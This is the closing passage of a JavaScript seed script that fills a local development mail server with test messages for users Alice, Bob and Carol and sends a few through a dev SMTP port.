  console.log(`seed: appended ${inbox.length} INBOX, ${sent.length} Sent, ${Object.values(other).reduce((n, l) => n + l.length, 0)} other, ${bulk.length} bulk (${Date.now() - t0} ms)`);
  await alice.logout();

  // Bob and Carol get a little mail of their own
  for (const [u, subject] of [[BOB.address, 'Welcome to the dev stack, Bob'], [CAROL.address, 'Welcome to the dev stack, Carol']]) {
    const c = await login(u);
    await c.append('INBOX', await compose({ from: ALICE, to: [{ name: '', address: u }], subject, text: 'This account exists so you can test sending between users.', messageId: mid('welcome'), date: ago(1) }), [], ago(1));
    await c.logout();
  }

  await viaSmtp();
  console.log('seed: 3 messages delivered bob -> alice through dev SMTP :2525 -> LMTP');
}

main().catch((e) => {
  console.error('seed failed:', e);
  process.exit(1);
});
